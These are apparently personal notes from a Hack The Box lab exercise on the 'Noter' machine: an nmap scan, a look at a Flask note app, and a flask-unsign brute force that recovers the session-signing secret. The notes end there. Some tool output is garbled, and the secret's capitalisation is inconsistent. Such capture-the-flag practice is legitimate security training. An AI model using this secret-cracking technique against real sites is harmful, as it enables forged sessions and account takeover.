Hack The Box noter

Nmap scan  

```
# Nmap 7.92 scan initiated Mon May  9 10:22:59 2022 as: nmap -sCV -o nmap 10.129.59.70
Nmap scan report for 10.129.59.70
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  9 10:23:32 2022 -- 1 IP address (1 host up) scanned in 33.19 seconds
````

The scan reveal 3 open port classic ssh on 22, 21 on ftp and 5000 http
ftp is not  allowed to anonymous login

Connecting to http on 5000 in browser. A web page is running called Noter 
It look like python flask framework

It allowd to register account  

Register and login  as user. We have some function  like add notes and noter editer. Additionly it use a thirdparty script to edit 
the notes which is called "ckediter".

Nothing much intersting  with that functions

Check the cookie it use the flask session cookies to manage the sessions

encoded cookie

```
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidXNlciJ9.YnjkQg.qfVnrJ8yVPJ0J_HLEnsrY6IJXMc
```
decoded cookie
```
{'logged_in': True, 'username': 'user'}
```
Normaly the flask session cookies are signed with a secret. We need to identify the secert to modify
the cookie

Bruteforce the secret with tool called flask-sign
```bash
flask-unsign --unsign --cookie < cookie.txt 
[*] Session decodes to: {'logged_in': True, 'username': 'user'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (1792): -----BEGIN PRIVATE KEY-----***
[+] Found secret key after 17024 attemptsdsInfoexampl
'secret123'
````
Found the secret **"Secret123"**